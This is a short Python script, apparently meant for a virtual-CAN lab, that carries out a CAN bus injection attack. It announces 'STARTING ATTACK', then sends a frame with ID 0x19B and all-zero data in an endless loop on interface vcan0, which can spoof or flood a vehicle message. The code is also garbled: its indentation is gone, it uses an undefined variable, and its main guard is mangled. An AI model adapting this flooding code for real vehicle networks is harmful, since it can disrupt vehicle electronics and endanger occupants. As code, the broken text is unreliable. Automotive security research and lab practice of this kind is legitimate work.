import os
import time
import sys
import socket
import struct
TARGET_ID= 0x19B
DATA=b'\x00\x00\x00\x00\x00\x00\x00\x00'
INTERFACE="vcan0"

def main():
print("STARTING ATTACK")

try:
sock= socket.socket(socket.PF_CAN, socket. SOCK_RAW, socket. CAN_RAW)
sock.bind( (INTERFACE, ))
except OSError as e:
print(f"Can't connect to {INTERFACE_ID}. {e}'")

sys.exit (1)
can_fmt="<IB3x8s"
can_frame= struct.pack(can_fmt, TARGET_ID, len(DATA), DATA)
try:
while True:
sock. send (can_frame)
except KeyboardInterrupt:
print("\n attack stopped")
sock. close()
sys.exit(0)
except Exception as e:
print(f"\n Error during send: {e}")

if

name == " main ":
main()